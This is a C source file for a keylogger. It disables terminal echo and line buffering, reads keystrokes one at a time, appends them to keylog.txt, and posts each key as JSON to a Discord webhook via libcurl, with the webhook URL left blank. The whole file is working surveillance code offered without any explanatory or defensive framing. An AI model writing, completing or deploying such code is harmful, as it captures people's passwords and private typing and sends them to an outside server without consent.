#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <curl/curl.h>


#define LOG_FILE "keylog.txt"
#define DISCORD_WEBHOOK_URL "" 

void send_to_discord(const char *message) {
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_ALL); 
    curl = curl_easy_init();
    if(curl) {
        char json_data[256];
        snprintf(json_data, sizeof(json_data), "{\"content\": \"%s\"}", message);

        curl_easy_setopt(curl, CURLOPT_URL, DISCORD_WEBHOOK_URL);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, (struct curl_slist *) curl_slist_append(NULL, "Content-Type: application/json"));

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup(); 
}

void log_key(const char *key) {

    FILE *file = fopen(LOG_FILE, "a");
    if (file) {
        fprintf(file, "%s", key);
        fclose(file);
    } else {
        perror("Error opening log file");
    }

   
    send_to_discord(key);
}

int main(void) {
    struct termios prev_tl, modif_tl;
    
    if (tcgetattr(STDIN_FILENO, &prev_tl) != 0) {
        perror("Error getting terminal attributes");
        return 1;
    }
    
    modif_tl = prev_tl;

    // Modify terminal settings to disable echo and canonical mode
    modif_tl.c_lflag &= ~ECHO;    // Disable echo
    modif_tl.c_lflag &= ~ICANON;  // Disable canonical mode
    if (tcsetattr(STDIN_FILENO, TCSANOW, &modif_tl) != 0) {
        perror("Error setting terminal attributes");
        return 1;
    }

    char buffersz[2]; // Buffer for one character and null terminator

    printf("Keylogger started. Press Ctrl+C to stop.\n"); // Informative message
    while (1) {
        int n = read(STDIN_FILENO, buffersz, 1); // Read one character
        if (n < 0) {
            perror("Error reading input"); // Handle read error
            break; // Exit loop on error
        } else if (n > 0) {
            buffersz[1] = '\0'; 
            log_key(buffersz);  // Log the key
            printf("Logged: %s\n", buffersz); // Print logged character for debugging
        }
        usleep(10000); // Sleep for 10 milliseconds to reduce CPU usage
    }

    // Restore original terminal settings
    tcsetattr(STDIN_FILENO, TCSANOW, &prev_tl);
    return 0;
}
